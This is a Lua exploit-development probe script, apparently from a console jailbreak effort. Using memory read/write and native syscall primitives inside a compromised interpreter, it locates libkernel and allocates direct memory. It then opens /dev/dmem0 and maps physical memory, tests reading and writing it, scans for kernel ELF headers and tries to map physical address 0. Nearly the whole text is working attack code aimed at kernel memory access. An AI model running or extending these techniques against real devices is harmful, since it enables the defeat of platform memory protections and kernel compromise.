-- CRASH_CLASS: LOW
-- PROBE 528l: Verify mmap(477) + dmem0 fd = physical memory R/W
--
-- 528k: mmap(0, 0x4000, PROT_RW, MAP_SHARED, dmem0_fd, phys_addr)
-- returned 0x310BC4000 — a valid virtual address!
--
-- Now verify: can we read/write through it?
-- And can we map MORE physical memory (multiple pages)?

print("=== PROBE 528l: MMAP DMEM VERIFY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

-- Get libkernel
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
if lk_lo == 0 and lk_hi == 0 then
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name = ""
            for i = 0, 31 do
                local b = rd(N(ib3) + 8 + i)
                if b then local c = b % 256; if c == 0 then break end
                    if c >= 32 and c < 127 then name = name .. string.char(c) end
                end
            end
            if name:find("libkernel") then
                lk_lo = rd(N(ib3) + 0x108) or 0
                lk_hi = rd(N(ib3) + 0x10C) or 0
                if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
                if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
                break
            end
        end
    end
end
local lk_text = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local alloc_fn = lk_text + uint64(0x17EF0)
print("libkernel=" .. fmt(lk_text))

-- ============================================================
-- [A] Allocate physical memory
-- ============================================================
print("")
print("[A] Allocate physical memory")
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))
local ok_a, rv_a = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)
if not ok_a or N(rv_a) ~= 0 then print("  FAILED"); return end
local phys_addr = rq(N(phys_out))
print("  phys=" .. fmt(phys_addr))

-- ============================================================
-- [B] Open /dev/dmem0
-- ============================================================
print("")
print("[B] Open /dev/dmem0")
local devpath = memory.alloc(0x20)
local dname = "/dev/dmem0"
for i = 1, #dname do wd(N(devpath) + i - 1, string.byte(dname, i)) end
wd(N(devpath) + #dname, 0)
local ok_o, dmem_fd = pcall(function()
    return native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0))
end)
local fd = ok_o and N(dmem_fd) or -1
print("  fd=" .. fd)
if fd < 0 then print("  FAILED open dmem0"); return end

-- ============================================================
-- [C] mmap(477) with dmem0 fd and physical address as offset
-- ============================================================
print("")
print("[C] mmap dmem0 fd")
local sc_477 = mk(477)
local ok_m, rv_m = pcall(function()
    return sc_477(
        uint64(0),           -- addr (NULL = kernel picks)
        uint64(0x4000),      -- len (16KB = 1 page)
        uint64(3),           -- prot (PROT_READ|PROT_WRITE)
        uint64(1),           -- flags (MAP_SHARED)
        uint64(fd),          -- fd (dmem0)
        phys_addr            -- offset (physical address)
    )
end)

if not ok_m then print("  mmap CRASHED"); return end
local mapped_va = rv_m
local mn = N(mapped_va)
print("  rv=" .. fmt(mapped_va) .. " (" .. mn .. ")")

-- Check if it's a valid address (not -1)
local mh, ml = get_hi_lo(mapped_va)
if mh < 0 then mh = mh + 0x100000000 end
if ml < 0 then ml = ml + 0x100000000 end

if mh == 0xFFFFFFFF and ml == 0xFFFFFFFF then
    print("  FAILED: rv=-1")
    -- Try with offset=0 (map from start of dmem)
    print("")
    print("[C2] mmap dmem0 offset=0")
    local ok_m2, rv_m2 = pcall(function()
        return sc_477(uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(fd), uint64(0))
    end)
    if ok_m2 then
        print("  rv=" .. fmt(rv_m2))
        mapped_va = rv_m2
        mh, ml = get_hi_lo(mapped_va)
        if mh < 0 then mh = mh + 0x100000000 end
        if ml < 0 then ml = ml + 0x100000000 end
    end
end

if mh == 0xFFFFFFFF then
    print("  ALL mmap FAILED")
    pcall(function() native.fcall_with_rax(stub, 6, uint64(fd)) end)
    return
end

print("  *** MAPPED! VA=" .. fmt(mapped_va) .. " ***")

-- ============================================================
-- [D] Read mapped memory
-- ============================================================
print("")
print("[D] Read mapped physical memory")
for i = 0, 15 do
    local addr = N(mapped_va) + i * 8
    local v = rq(addr)
    if v then
        local line = string.format("  [+0x%02X] = %s", i * 8, fmt(v))
        local vh, vl = get_hi_lo(v)
        if vh < 0 then vh = vh + 0x100000000 end
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            local exp = math.floor(vh / 0x100000) % 0x800
            if exp ~= 0x7FF then
                line = line .. " *** KERNEL PTR? ***"
            end
        end
        print(line)
    else
        print(string.format("  [+0x%02X] = FAULT", i * 8))
    end
end

-- ============================================================
-- [E] Write test
-- ============================================================
print("")
print("[E] Write test")
local test_val = 0xCAFEBABE
wd(N(mapped_va), test_val)
local rb = rd(N(mapped_va))
local match = false
if rb then
    if rb < 0 then rb = rb + 0x100000000 end
    match = (rb == test_val)
end
print(string.format("  wrote=0x%X read=0x%X match=%s", test_val, rb or 0, tostring(match)))

-- Restore
wd(N(mapped_va), 0)

-- ============================================================
-- [F] Map multiple pages — scan for kernel ELF header
-- ============================================================
print("")
print("[F] Multi-page allocation + scan")

-- Allocate a LARGE block
local big_phys_out = memory.alloc(8)
wq(N(big_phys_out), uint64(0))
local big_size = 0x100000  -- 1 MiB
local ok_big, rv_big = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(big_size),
        uint64(0x4000), uint64(0), uint64(N(big_phys_out)))
end)
local big_phys = rq(N(big_phys_out))

if ok_big and N(rv_big) == 0 and big_phys then
    print("  alloc 1MiB: phys=" .. fmt(big_phys))

    -- Map it
    local ok_bm, rv_bm = pcall(function()
        return sc_477(uint64(0), uint64(big_size), uint64(3), uint64(1), uint64(fd), big_phys)
    end)

    if ok_bm and rv_bm then
        local bh, bl = get_hi_lo(rv_bm)
        if bh < 0 then bh = bh + 0x100000000 end
        if bl < 0 then bl = bl + 0x100000000 end
        if bh ~= 0xFFFFFFFF then
            print("  mapped 1MiB at " .. fmt(rv_bm))

            -- Scan first dword of each page for ELF magic
            local elf_count = 0
            local pages = big_size / 0x4000
            for p = 0, pages - 1 do
                local pa = N(rv_bm) + p * 0x4000
                local d = rd(pa)
                if d then
                    if d < 0 then d = d + 0x100000000 end
                    if d == 0x464C457F then  -- \x7FELF
                        print(string.format("  page %d (+0x%X): ELF HEADER!", p, p * 0x4000))
                        elf_count = elf_count + 1
                    end
                end
            end
            if elf_count == 0 then
                print("  no ELF headers in 1MiB scan (" .. pages .. " pages)")
            end
        else
            print("  1MiB mmap failed: rv=" .. fmt(rv_bm))
        end
    end
else
    print("  1MiB alloc failed: rv=" .. (rv_big and N(rv_big) or "crash"))
end

-- ============================================================
-- [G] Map at physical address 0 — try to see kernel
-- ============================================================
print("")
print("[G] mmap dmem0 at phys offset 0")
local ok_zero, rv_zero = pcall(function()
    return sc_477(uint64(0), uint64(0x4000), uint64(1), uint64(1), uint64(fd), uint64(0))
end)
if ok_zero and rv_zero then
    local zh, zl = get_hi_lo(rv_zero)
    if zh < 0 then zh = zh + 0x100000000 end
    if zh ~= 0xFFFFFFFF then
        print("  mapped phys 0 at " .. fmt(rv_zero))
        local d = rd(N(rv_zero))
        if d then
            if d < 0 then d = d + 0x100000000 end
            print(string.format("  [0x0] = 0x%08X", d))
        else
            print("  [0x0] = FAULT")
        end
    else
        print("  FAILED: rv=-1")
    end
else
    print("  FAILED: crash")
end

-- Cleanup
pcall(function() native.fcall_with_rax(stub, 6, uint64(fd)) end)

print("")
print("alive=" .. tostring(alive()))
print("=== 528l COMPLETE ===")
